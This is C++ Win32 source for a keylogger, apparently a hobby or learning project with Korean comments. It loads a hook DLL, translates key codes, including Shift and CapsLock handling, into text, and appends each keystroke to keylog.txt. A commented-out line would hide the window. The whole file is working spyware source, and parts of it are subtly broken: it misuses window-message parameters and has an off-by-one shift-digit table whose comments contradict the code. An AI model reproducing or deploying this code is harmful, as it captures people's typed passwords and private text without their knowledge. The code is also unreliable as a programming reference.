#include "pch.h"
#include <iostream>
#include <windows.h>
#include <conio.h>
#include "../keyloggerDll/keyloggerDll.h"

#define KEYLOGGER_DLL "KeyloggerDll.dll"
using namespace std;

LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);
typedef void(*PFN_HOOKSTART)(HWND);
typedef void(*PFN_HOOKSTOP)();

HINSTANCE g_hInst;
HHOOK g_hHook = NULL;
HWND hWnd = NULL;

int treatKey(string charPressed, DWORD key)
{
	FILE *FP;
	fopen_s(&FP, "keylog.txt", "a");
	fprintf(FP, "%s", charPressed.c_str());
	fclose(FP);
	return 0;
}

LRESULT CALLBACK WndProc(HWND hWnd, UINT iMessage, WPARAM wParam, LPARAM lParam)
{
	HDC hdc;
	PAINTSTRUCT ps;
	PFN_HOOKSTART HookStart = NULL;
	PFN_HOOKSTOP HookStop = NULL;
	HMODULE hDll = NULL;

	hDll = LoadLibraryA(KEYLOGGER_DLL);
	if (hDll == NULL)
	{
		cout << GetLastError();
		return 1;
	}

	HookStart = (PFN_HOOKSTART)GetProcAddress(hDll, "HookStart");
	HookStop = (PFN_HOOKSTOP)GetProcAddress(hDll, "HookStop");
	PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;
	static SHORT nKey = 0;		// 쉬프트키 사용 감지를 위한 변수
	switch (iMessage) {
	case WM_CREATE:
		HookStart(hWnd);
		return 0;

	case WM_CHAR:
		switch (wParam) {
		case WM_KEYDOWN: case WM_SYSKEYDOWN:
			char charPressed;
			if (nKey == 0) {
				nKey = GetAsyncKeyState(VK_SHIFT);
				if (nKey == 1)
					treatKey("[SHIFT]", p->vkCode);
			}
			if (p->vkCode == VK_CAPITAL) {
				treatKey("[CAPSLOCK]", p->vkCode);
			}
			else if (p->vkCode == VK_RETURN) {
				treatKey("[ENTER]\n", p->vkCode);
			}
			else if (p->vkCode == VK_TAB) {
				treatKey("[TAB]", p->vkCode);
			}
			else if (p->vkCode == VK_SPACE) {
				treatKey("[SPACE]\x20", p->vkCode);
			}
			else if (p->vkCode == VK_CONTROL || p->vkCode == VK_LCONTROL || p->vkCode == VK_RCONTROL) {
				treatKey("[CTRL]", p->vkCode);
			}
			else if (p->vkCode == VK_ESCAPE) {
				treatKey("[ESC]", p->vkCode);
			}
			else if (p->vkCode == VK_END) {
				treatKey("[END]", p->vkCode);
			}
			else if (p->vkCode == VK_HOME) {
				treatKey("[HOME]", p->vkCode);
			}
			else if (p->vkCode == VK_LEFT) {
				treatKey("[LEFT]", p->vkCode);
			}
			else if (p->vkCode == VK_UP) {
				treatKey("[UP]", p->vkCode);
			}
			else if (p->vkCode == VK_RIGHT) {
				treatKey("[RIGHT]", p->vkCode);
			}
			else if (p->vkCode == VK_DOWN) {
				treatKey("[DOWN]", p->vkCode);
			}
			else if (p->vkCode == VK_DELETE) {
				treatKey("[DELETE]", p->vkCode);
			}
			else if (p->vkCode == VK_INSERT) {
				treatKey("[INSERT]", p->vkCode);
			}
			else if (p->vkCode == VK_F1) {
				treatKey("[F1]", p->vkCode);
			}
			else if (p->vkCode == VK_F2) {
				treatKey("[F2]", p->vkCode);
			}
			else if (p->vkCode == VK_F3) {
				treatKey("[F3]", p->vkCode);
			}
			else if (p->vkCode == VK_F4) {
				treatKey("[F4]", p->vkCode);
			}
			else if (p->vkCode == VK_F5) {
				treatKey("[F5]", p->vkCode);
			}
			else if (p->vkCode == VK_F6) {
				treatKey("[F6]", p->vkCode);
			}
			else if (p->vkCode == VK_F7) {
				treatKey("[F7]", p->vkCode);
			}
			else if (p->vkCode == VK_F8) {
				treatKey("[F8]", p->vkCode);
			}
			else if (p->vkCode == VK_F9) {
				treatKey("[F9]", p->vkCode);
			}
			else if (p->vkCode == VK_F10) {
				treatKey("[F10]", p->vkCode);
			}
			else if (p->vkCode == VK_F11) {
				treatKey("[F11]", p->vkCode);
			}
			else if (p->vkCode == VK_F12) {
				treatKey("[F12]", p->vkCode);
			}
			else if (p->vkCode == VK_F13) {
				treatKey("[F13]", p->vkCode);
			}
			else if (p->vkCode == VK_F14) {
				treatKey("[F14]", p->vkCode);
			}
			else if (p->vkCode == VK_F15) {
				treatKey("[F15]", p->vkCode);
			}
			else if (p->vkCode == VK_NUMLOCK) {
				treatKey("[NUMLOCK]", p->vkCode);
			}
			else if (p->vkCode == 106) {
				treatKey("*", p->vkCode);
			}
			else if (p->vkCode == 186) {
				if (nKey) {
					treatKey(":", p->vkCode);
					nKey = 0;
				}
				else if (!nKey)
					treatKey(";", p->vkCode);
			}
			else if (p->vkCode == 187 || p->vkCode == 107) {
				if (nKey) {
					treatKey("+", p->vkCode);
					nKey = 0;
				}
				else if (!nKey)
					treatKey("=", p->vkCode);
			}
			else if (p->vkCode == 188) {
				if (nKey) {
					treatKey("<", p->vkCode);
					nKey = 0;
				}
				else if (!nKey)
					treatKey(",", p->vkCode);
			}
			else if (p->vkCode == 189 || p->vkCode == 109) {
				if (nKey) {
					treatKey("_", p->vkCode);
					nKey = 0;
				}
				else if (!nKey)
					treatKey("-", p->vkCode);
			}
			else if (p->vkCode == 190 || p->vkCode == 110) {
				if (nKey) {
					treatKey(">", p->vkCode);
					nKey = 0;
				}
				else if (!nKey)
					treatKey(".", p->vkCode);
			}
			else if (p->vkCode == 191 || p->vkCode == 111) {
				if (nKey) {
					treatKey("?", p->vkCode);
					nKey = 0;
				}
				else if (!nKey)
					treatKey("/", p->vkCode);
			}
			else if (p->vkCode == 192) {
				if (nKey) {
					treatKey("~", p->vkCode);
					nKey = 0;
				}
				else if (!nKey)
					treatKey("`", p->vkCode);
			}
			else if (p->vkCode == 219) {
				if (nKey) {
					treatKey("{", p->vkCode);
					nKey = 0;
				}
				else if (!nKey)
					treatKey("[", p->vkCode);
			}
			else if (p->vkCode == 221) {
				if (nKey) {
					treatKey("}", p->vkCode);
					nKey = 0;
				}
				else if (!nKey)
					treatKey("]", p->vkCode);
			}
			else if (p->vkCode == 222) {
				if (nKey) {
					treatKey("\"", p->vkCode);
					nKey = 0;
				}
				else if (!nKey)
					treatKey("'", p->vkCode);
				}
			else if (p->vkCode == 226) {
				if (nKey) {
					treatKey("|", p->vkCode);
					nKey = 0;
				}
				else if (!nKey)
					treatKey("\\", p->vkCode);
					}
			else {
				charPressed = (char)p->vkCode;
				if (charPressed > 0) {
					if (charPressed >= 48 && charPressed <= 57) {
						if (nKey) {
							switch (charPressed) {
							case 48:
								charPressed = 41;	// 1 -> !
								break;
							case 49:
								charPressed = 33;	// 2 -> @
								break;
							case 50:
								charPressed = 64;	// 3 -> #
								break;
							case 51:
								charPressed = 35;	// 4 -> $
								break;
							case 52:
								charPressed = 36;	// 5 -> %
								break;
							case 53:
								charPressed = 37;	// 6 -> ^
								break;
							case 54:
								charPressed = 94;	// 7 -> &
								break;
							case 55:
								charPressed = 38;	// 8 -> *
								break;
							case 56:
								charPressed = 42;	// 9 -> (
								break;
							case 57:
								charPressed = 40;	// 0 -> )
								break;
							}
							nKey = 0;
						}
					}
					if (charPressed >= 96 && charPressed <= 105) {	//키보드 숫자패드의 0~9 처리
						switch (charPressed) {
						case 96:
							charPressed = 48;
							break;
						case 97:
							charPressed = 49;
							break;
						case 98:
							charPressed = 50;
							break;
						case 99:
							charPressed = 51;
							break;
						case 100:
							charPressed = 52;
							break;
						case 101:
							charPressed = 53;
							break;
						case 102:
							charPressed = 54;
							break;
						case 103:
							charPressed = 55;
							break;
						case 104:
							charPressed = 56;
							break;
						case 105:
							charPressed = 57;
							break;
						}
					}
					if (!nKey && !GetKeyState(VK_CAPITAL)) {
						charPressed = tolower(charPressed);
					}
					else if ((nKey || GetKeyState(VK_CAPITAL)) && isalpha(charPressed)) {
						charPressed = toupper(charPressed);
						nKey = 0;
					}
					treatKey(string(1, charPressed), p->vkCode);
				}
			}
			return 0;

		case WM_DESTROY:
			HookStop();
			return 0;
		}
		return DefWindowProc(hWnd, iMessage, wParam, lParam);
	}
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance
	, LPSTR lpszCmdParam, int nCmdShow)
{
	HWND hWnd;
	MSG Message;
	WNDCLASS WndClass;
	g_hInst = hInstance;

	HWND hWndMain;
	LPCTSTR lpszClass = TEXT("Keylogger");

	WndClass.cbClsExtra = 0;
	WndClass.cbWndExtra = 0;
	WndClass.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
	WndClass.hCursor = LoadCursor(NULL, IDC_ARROW);
	WndClass.hIcon = LoadIcon(NULL, IDI_APPLICATION);
	WndClass.hInstance = hInstance;
	WndClass.lpfnWndProc = WndProc;
	WndClass.lpszClassName = lpszClass;
	WndClass.lpszMenuName = NULL;
	WndClass.style = CS_HREDRAW | CS_VREDRAW;
	RegisterClass(&WndClass);

	hWnd = CreateWindow(lpszClass, lpszClass, WS_OVERLAPPEDWINDOW,
		CW_USEDEFAULT, CW_USEDEFAULT, 500, 100,
		NULL, (HMENU)NULL, hInstance, NULL);
	//ShowWindow(hWnd, SW_HIDE);  // SW_HIDE : 윈도우 숨기기, nCmdShow : 윈도우 보이기
	//hWndMain = hWnd;

	while (GetMessage(&Message, NULL, 0, 0)) {   //http://soen.kr/lecture/win32api/lec4/lec4-1-4.htm : GetMessage로 메시지큐에서 메시지를 꺼내온 후 이 메시지를 TranslatteMessage함수로 넘겨준 후 이 문자가 문자키인지 검사한 후 WM_CHAR 메시지를 만들어서 메시지큐에 덧붙인다.
		TranslateMessage(&Message);
		DispatchMessage(&Message);
	}
	return (int)Message.wParam;
}